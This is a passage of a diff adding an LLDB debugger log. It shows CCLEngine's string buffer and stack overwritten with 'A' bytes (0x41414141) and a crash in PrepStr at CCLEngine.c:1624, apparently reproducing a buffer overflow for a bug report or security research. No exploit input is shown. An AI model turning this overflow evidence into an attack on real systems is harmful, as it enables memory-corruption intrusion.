+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [67] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [68] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [69] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [70] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [71] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [72] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [73] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [74] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [75] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [76] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [77] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [78] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [79] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [80] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [81] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [82] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [83] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [84] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [85] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [86] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [87] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [88] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [89] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [90] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [91] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [92] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [93] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [94] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [95] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+  }
+  strBuf = {
+    [0] = '\x05'
+    [1] = 'B'
+    [2] = 'A'
+    [3] = 'A'
+    [4] = 'A'
+    [5] = 'A'
+    [6] = 'A'
+    [7] = 'A'
+    [8] = 'A'
+    [9] = 'A'
+    [10] = 'A'
+    [11] = 'A'
+    [12] = 'A'
+    [13] = 'A'
+    [14] = 'A'
+    [15] = 'A'
+    [16] = 'A'
+    [17] = 'A'
+    [18] = 'A'
+    [19] = 'A'
+    [20] = 'A'
+    [21] = 'A'
+    [22] = 'A'
+    [23] = 'A'
+    [24] = 'A'
+    [25] = 'A'
+    [26] = 'A'
+    [27] = 'A'
+    [28] = 'A'
+    [29] = 'A'
+    [30] = 'A'
+    [31] = 'A'
+    [32] = 'A'
+    [33] = 'A'
+    [34] = 'A'
+    [35] = 'A'
+    [36] = 'A'
+    [37] = 'A'
+    [38] = 'A'
+    [39] = 'A'
+    [40] = 'A'
+    [41] = 'A'
+    [42] = 'A'
+    [43] = 'A'
+    [44] = 'A'
+    [45] = 'A'
+    [46] = 'A'
+    [47] = 'A'
+    [48] = 'A'
+    [49] = 'A'
+    [50] = 'A'
+    [51] = 'A'
+    [52] = 'A'
+    [53] = 'A'
+    [54] = 'A'
+    [55] = 'A'
+    [56] = 'A'
+    [57] = 'A'
+    [58] = 'A'
+    [59] = 'A'
+    [60] = 'A'
+    [61] = 'A'
+    [62] = 'A'
+    [63] = 'A'
+    [64] = 'A'
+    [65] = 'A'
+    [66] = 'A'
+    [67] = 'A'
+    [68] = 'A'
+    [69] = 'A'
+    [70] = 'A'
+    [71] = 'A'
+    [72] = 'A'
+    [73] = 'A'
+    [74] = 'A'
+    [75] = 'A'
+    [76] = 'A'
+    [77] = 'A'
+    [78] = 'A'
+    [79] = 'A'
+    [80] = 'A'
+    [81] = 'A'
+    [82] = 'A'
+    [83] = 'A'
+    [84] = 'A'
+    [85] = 'A'
+    [86] = 'A'
+    [87] = 'A'
+    [88] = 'A'
+    [89] = 'A'
+    [90] = 'A'
+    [91] = 'A'
+    [92] = 'A'
+    [93] = 'A'
+    [94] = 'A'
+    [95] = 'A'
+    [96] = 'A'
+    [97] = 'A'
+    [98] = 'A'
+    [99] = 'A'
+    [100] = 'A'
+    [101] = 'A'
+    [102] = 'A'
+    [103] = 'A'
+    [104] = 'A'
+    [105] = 'A'
+    [106] = 'A'
+    [107] = 'A'
+    [108] = 'A'
+    [109] = 'A'
+    [110] = 'A'
+    [111] = 'A'
+    [112] = 'A'
+    [113] = 'A'
+    [114] = 'A'
+    [115] = 'A'
+    [116] = 'A'
+    [117] = 'A'
+    [118] = 'A'
+    [119] = 'A'
+    [120] = 'A'
+    [121] = 'A'
+    [122] = 'B'
+    [123] = 'A'
+    [124] = 'A'
+    [125] = 'A'
+    [126] = 'A'
+    [127] = 'A'
+    [128] = 'A'
+    [129] = 'A'
+    [130] = 'A'
+    [131] = 'A'
+    [132] = 'A'
+    [133] = 'A'
+    [134] = 'A'
+    [135] = 'A'
+    [136] = 'A'
+    [137] = 'A'
+    [138] = 'A'
+    [139] = 'A'
+    [140] = 'A'
+    [141] = 'A'
+    [142] = 'A'
+    [143] = 'A'
+    [144] = 'A'
+    [145] = 'A'
+    [146] = 'A'
+    [147] = 'A'
+    [148] = 'A'
+    [149] = 'A'
+    [150] = 'A'
+    [151] = 'A'
+    [152] = 'A'
+    [153] = 'A'
+    [154] = 'A'
+    [155] = 'A'
+    [156] = 'A'
+    [157] = 'A'
+    [158] = 'A'
+    [159] = 'A'
+    [160] = 'A'
+    [161] = 'A'
+    [162] = 'A'
+    [163] = 'A'
+    [164] = 'A'
+    [165] = 'A'
+    [166] = 'A'
+    [167] = 'A'
+    [168] = 'A'
+    [169] = 'A'
+    [170] = 'A'
+    [171] = 'A'
+    [172] = 'A'
+    [173] = 'A'
+    [174] = 'A'
+    [175] = 'A'
+    [176] = 'A'
+    [177] = 'A'
+    [178] = 'A'
+    [179] = 'A'
+    [180] = 'A'
+    [181] = 'A'
+    [182] = 'A'
+    [183] = 'A'
+    [184] = 'A'
+    [185] = 'A'
+    [186] = 'A'
+    [187] = 'A'
+    [188] = 'A'
+    [189] = 'A'
+    [190] = 'A'
+    [191] = 'A'
+    [192] = 'A'
+    [193] = 'A'
+    [194] = 'A'
+    [195] = 'A'
+    [196] = 'A'
+    [197] = 'A'
+    [198] = 'A'
+    [199] = 'A'
+    [200] = 'A'
+    [201] = 'A'
+    [202] = 'A'
+    [203] = 'A'
+    [204] = 'A'
+    [205] = 'A'
+    [206] = 'A'
+    [207] = 'A'
+    [208] = 'A'
+    [209] = 'A'
+    [210] = 'A'
+    [211] = 'A'
+    [212] = 'A'
+    [213] = 'A'
+    [214] = 'A'
+    [215] = 'A'
+    [216] = 'A'
+    [217] = 'A'
+    [218] = 'A'
+    [219] = 'A'
+    [220] = 'A'
+    [221] = 'A'
+    [222] = 'A'
+    [223] = 'A'
+    [224] = 'A'
+    [225] = 'A'
+    [226] = 'A'
+    [227] = 'A'
+    [228] = 'A'
+    [229] = 'A'
+    [230] = 'A'
+    [231] = 'A'
+    [232] = 'A'
+    [233] = 'A'
+    [234] = 'A'
+    [235] = 'A'
+    [236] = 'A'
+    [237] = 'A'
+    [238] = 'A'
+    [239] = 'A'
+    [240] = 'A'
+    [241] = 'A'
+    [242] = 'A'
+    [243] = 'B'
+    [244] = 'A'
+    [245] = 'A'
+    [246] = 'A'
+    [247] = 'A'
+    [248] = 'A'
+    [249] = 'A'
+    [250] = 'A'
+    [251] = 'A'
+    [252] = 'A'
+    [253] = 'A'
+    [254] = 'A'
+    [255] = 'A'
+  }
+  askLabel = 16705
+  stack = {
+    [0] = 16705
+    [1] = 16705
+    [2] = 16705
+    [3] = 16705
+    [4] = 16705
+    [5] = 16705
+    [6] = 16705
+    [7] = 16705
+    [8] = 16705
+    [9] = 16705
+    [10] = 16705
+    [11] = 16705
+    [12] = 16705
+    [13] = 16705
+    [14] = 16705
+    [15] = 16705
+  }
+  topOfStack = 1094795585
+  writeBufIndex = 'A'
+  logMaskOn = 'A'
+}
+(lldb) print d
+error: Couldn't materialize: couldn't get the value of variable d: variable not available
+error: errored out in DoExecute, couldn't PrepareToExecuteJITExpression
+(lldb) c
+Process 847 resuming
+Process 847 stopped
+* thread #1: tid = 0x2675, 0x000000010b956f30 CCLEngine`PrepStr(destStr=<unavailable>, isVarString=<unavailable>, varIndex=<unavailable>, varSubstitution=1) + 485 at CCLEngine.c:1624, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
+    frame #0: 0x000000010b956f30 CCLEngine`PrepStr(destStr=<unavailable>, isVarString=<unavailable>, varIndex=<unavailable>, varSubstitution=1) + 485 at CCLEngine.c:1624 [opt]
+   1621	                        maskPtr = d + SV.maskStart - 1;
+   1622	                    }
+   1623	
+-> 1624	                    for (i = 1; i <= *vsp; i++, dstStrLen++)
+   1625	                        *d++ = vsp[i];
+   1626	
+   1627	                    if (maskPtr) {
+(lldb) q
+Quitting LLDB will detach from one or more processes. Do you really want to proceed: [Y/n] 
+
